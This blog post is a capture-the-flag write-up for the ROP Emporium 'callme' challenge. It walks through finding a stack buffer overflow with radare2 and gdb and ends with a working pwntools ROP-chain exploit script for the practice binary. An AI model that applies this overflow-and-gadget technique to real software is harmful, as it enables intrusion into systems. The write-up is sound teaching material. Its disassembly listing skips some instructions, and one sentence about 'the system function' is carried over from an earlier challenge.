---
layout: post
title: Ropemporium callme challenge
date: 2021-12-20 21:08 +0300
categories: [malware]
tags: [ctf, ropemporium]
---

## Introduction

Challenge Description

The goal of the challenge is understanding how more than one argument is passed in x64 function. The challenge can be downloaded from the author`s website [ropemporium](https://ropemporium.com)

> Reliably make consecutive calls to imported functions.
> Use some new techniques and learn about the Procedure Linkage Table.

The program needs make consecutive calls to a function with three arguments in order to get a correct flag. The challenge description is similar to the split challenge.

> **You must call the callme_one(), callme_two() and callme_three() functions in that order, each with the arguments 0xdeadbeef, 0xcafebabe, 0xd00df00d e.g. callme_one(0xdeadbeef, 0xcafebabe, 0xd00df00d) to print the flag. For the x86_64 binary double up those values, e.g. callme_one(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)**

check the binary protections enabled on the `callme` binary, only **NX**( Not Executable) is enabled on the binary as shown below.

```bash
vx@archie:callme$ checksec --file callme
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'
```

Open **callme** binary in radare2 to look for exploitable vulnerability and examine the behavior. radare2 is a powerful disassembler/debugging tool used for examining the behavior of programs.

![](/assets/images/ropemporium/callme_bug.png)

From the above image we use **pdf** command to disassemble a given function. Function **pwnme** looks similar to the previous challenges ret2win and split.

From the aDisassembled program, we are filling a buffer of size 0x20(32bytes) with a constant byte of zero. memset is used to overwrite any values that is present in the memory area specified. The memory area we are overwriting is [rbp-0x20]. This means we are allocating a memory buffer of size 32bytes from the address of base pointer in the stack.
![](/assets/images/ropemporium/stack.png)

Next function is read function, which reads for user input and stores in the allocated buffer.

```c
ssize_t read(int fd, void *buf, size_t count);
```

From assembly code, we are reading `0x200` bytes from the standard input file descriptor and storing it in buffer, meaning we are reading more than what the buffer can hold therefore leading to a stack buffer overflow.

For exploitation stack overflow, fill the buffer, overwrite rbp register and control the return address with desired address.

Because the system function receives one argument, look for one gadgets that we control the rdi, rsi and rdx registers.

**What are gadgets?**

Gadgets are sequence of instructions the end with ret. because we want to load three argument into registers, we will look for a pop rdi, pop rsi, pop rdx; ret instruction in order to pass an arguments to the callme_one, callme_two, callme_three functions.

The example of the **pop rdi,pop rsi,pop rdx, ret** gadget is shown in image below.

![](/assets/images/ropemporium/poprdi_callme.png)
Next is determine addresses of `callme_one`, `callme_two`, `callme_three` functions using gdb.

```nasm
(gdb) info functions
All defined functions:
Non-debugging symbols:
0x00000000004006a8  _init
0x00000000004006d0  puts@plt
0x00000000004006e0  printf@plt
0x00000000004006f0  callme_three@plt
0x0000000000400700  memset@plt
0x0000000000400710  read@plt
0x0000000000400720  callme_one@plt
0x0000000000400730  setvbuf@plt
0x0000000000400740  callme_two@plt
0x0000000000400750  exit@plt
0x0000000000400760  _start
0x0000000000400790  _dl_relocate_static_pie
0x00000000004007a0  deregister_tm_clones
0x00000000004007d0  register_tm_clones
0x0000000000400810  __do_global_dtors_aux
0x0000000000400840  frame_dummy
0x0000000000400847  main
0x0000000000400898  pwnme
0x00000000004008f2  usefulFunction
0x000000000040093c  usefulGadgets
0x0000000000400940  __libc_csu_init
0x00000000004009b0  __libc_csu_fini
0x00000000004009b4  _fini
(gdb)
```

Reverse engineer one of the target function in order to understand how the arguments are passed to the function.Because the **callme** binary does PLT relocations of the functions of callme, disassemble the target shared library **libcallme.so** as shown below.

```nasm
vx@archie:callme$ gdb -q libcallme.so
Reading symbols from libcallme.so...
(No debugging symbols found in libcallme.so)
(gdb) disas callme_one
Dump of assembler code for function callme_one:
   0x000000000000081a <+0>:	push   rbp
   0x000000000000081b <+1>:	mov    rbp,rsp
   0x000000000000081e <+4>:	sub    rsp,0x30
   0x0000000000000822 <+8>:	mov    QWORD PTR [rbp-0x18],rdi
   0x0000000000000826 <+12>:	mov    QWORD PTR [rbp-0x20],rsi
   0x000000000000082a <+16>:	mov    QWORD PTR [rbp-0x28],rdx
   0x000000000000082e <+20>:	movabs rax,0xdeadbeefdeadbeef
   0x0000000000000838 <+30>:	cmp    QWORD PTR [rbp-0x18],rax
   0x000000000000083c <+34>:	jne    0x912 <callme_one+248>
   0x0000000000000842 <+40>:	movabs rax,0xcafebabecafebabe
   0x000000000000084c <+50>:	cmp    QWORD PTR [rbp-0x20],rax
   0x0000000000000850 <+54>:	jne    0x912 <callme_one+248>
   0x0000000000000856 <+60>:	movabs rax,0xd00df00dd00df00d
   0x0000000000000860 <+70>:	cmp    QWORD PTR [rbp-0x28],rax
   0x0000000000000864 <+74>:	jne    0x912 <callme_one+248>
   0x000000000000086a <+80>:	mov    QWORD PTR [rbp-0x8],0x0
   0x0000000000000872 <+88>:	lea    rsi,[rip+0x32f]        # 0xba8
   0x0000000000000879 <+95>:	lea    rdi,[rip+0x32a]        # 0xbaa
   0x0000000000000912 <+248>:	lea    rdi,[rip+0x301]        # 0xc1a
   0x0000000000000919 <+255>:	call   0x6c0 <puts@plt>
   0x000000000000091e <+260>:	mov    edi,0x1
   0x0000000000000923 <+265>:	call   0x720 <exit@plt>
   0x0000000000000928 <+270>:	nop
   0x0000000000000929 <+271>:	leave
   0x000000000000092a <+272>:	ret
End of assembler dump.
(gdb)
```

From the disassembly code above, the function compares the arguments passed to the callme_one function. If string values are not equal to values passed to the `rdi`, `rsi` and `rdx` registers the program exits, otherwise we get a flag.

From previous knowledge of solving other challenges, we need to overwrite the return address with controlled pop rdi, pop rsi, pop rdx, ret gadget and call each function in a sequential manner.

Fully working rop chain code.

```python
import pwn

#Various setting for pwntools
pwn.context.encoding = "latin-1"
pwn.warnings.simplefilter("ignore")
pwn.context.arch = "amd64"

io = pwn.process('./callme')

pop_rdi_rsi_rdx = pwn.p64(0x0040093c)  #pop rdi; pop rsi; pop rdx; ret gadget
arg1 = pwn.p64(0xdeadbeefdeadbeef)
arg2 = pwn.p64(0xcafebabecafebabe)
arg3 = pwn.p64(0xd00df00dd00df00d)

callme_one_addr = pwn.p64(0x0000000000400720)
callme_two_addr = pwn.p64(0x0000000000400740)
callme_three_addr =pwn.p64(0x00000000004006f0)

#call the callme_one function
callme_one = pop_rdi_rsi_rdx
callme_one += arg1
callme_one += arg2
callme_one += arg3
callme_one += callme_one_addr

#callme_two function
callme_two = pop_rdi_rsi_rdx
callme_two += arg1
callme_two += arg2
callme_two  += arg3
callme_two += callme_two_addr

#callme_three function
callme_three = pop_rdi_rsi_rdx
callme_three += arg1
callme_three += arg2
callme_three += arg3
callme_three += callme_three_addr

payload = b"A" *32   #fill the buffer
payload += b"B" * 8  #overwrite the rbp
payload += callme_one
payload += callme_two
payload += callme_three

io.writeafter('>', payload)

pwn.info(io.clean().decode())
```

Successful execution of the above code, correct flag is printed.

![](/assets/images/ropemporium/callme-flag.png)
